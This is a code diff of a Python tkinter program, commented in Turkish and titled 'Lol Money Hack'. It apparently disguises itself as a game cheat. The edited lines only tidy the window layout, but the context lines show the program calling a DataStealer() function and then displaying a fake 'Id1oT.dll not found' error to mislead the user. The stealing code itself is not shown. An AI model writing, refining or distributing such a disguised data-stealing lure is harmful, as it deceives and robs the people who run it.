@@ -603,20 +603,18 @@ image = tkinter.PhotoImage(data=req.urlopen(
 #with open("lol.png.txt", "rb") as base64_png:
 #    image = tkinter.PhotoImage(data=base64_png.read())
 
-app.iconphoto(1, image)         # Pencere ikonu (Görünmeyecek)
+app.iconphoto(False, image)     # Pencere ikonu (Görünmeyecek)
 app.title("Lol Money Hack")     # Pencere Başlığı (Görünmeyecek)
 app.wm_overrideredirect(True)   # Başlık-Kapat-Küçült Tuşlarının olduğu kısmı kaldırıyoruz
 app.attributes("-alpha", 0.9)   # Penceremize hafif şeffaflık katıyoruz
+app.resizable(0, 0)             # Yeniden boyutlandırmayı kapattık
 
-windowWidth = app.winfo_reqwidth()      # penceremizin enlemini aldık
-windowHeight = app.winfo_reqheight()    # penceremizin boylamını aldık
-positionRight = int(app.winfo_screenwidth() / 2.5 - windowWidth / 2)    # Pencere konumumuzun enlemini
-positionDown = int(app.winfo_screenheight() / 2.5 - windowHeight / 2)   # Pencere konumumuzun boylamını değiştiriyor
+windowWidth = app.winfo_reqwidth()                                      # Penceremizin enlemini aldık
+windowHeight = app.winfo_reqheight()                                    # Penceremizin boylamını aldık
+positionRight = int(app.winfo_screenwidth() / 2.5 - windowWidth / 2)    # Pencere konumumuzun enlemini değiştiriyoruz
+positionDown = int(app.winfo_screenheight() / 2.5 - windowHeight / 2)   # Pencere konumumuzun boylamını değiştiriyoruz
 app.geometry(f"+{positionRight}+{positionDown}")                        # Pencere konumumuz ayarlıyoruz
-
-# NOT# positionRight ve positionDown 'da pencereyi ortalarken "2.5" rakamında değişiklik yapmanız gerekebilir
-
-app.resizable(0, 0)                     # Yeniden boyutlandırmayı kapattık
+    # NOT # positionRight ve positionDown 'da pencereyi ortalarken "2.5" rakamında değişiklik yapmanız gerekebilir
 
 label = tkinter.Label(image=image,
                       text=" ",
@@ -649,7 +647,7 @@ DataStealer()                               # DataStealer Fonksiyonumuzu Çağı
 
 ########################################################################
 Muamele()                                   # Muamele Fonksiyonumuzu Çağırdık
-sleep(2)                                    # 2 Saniye es verip hatamızı çakıyoruz :)
+sleep(2)                                    # 2 Saniye bekletip hatamızı çakalım :)
 ############ Bitirdik
 
 messagebox.showerror("LOL Money Hack", "Id1oT.dll not found !")  # :) .dll bulunamadı adında bir hata çıkarttık
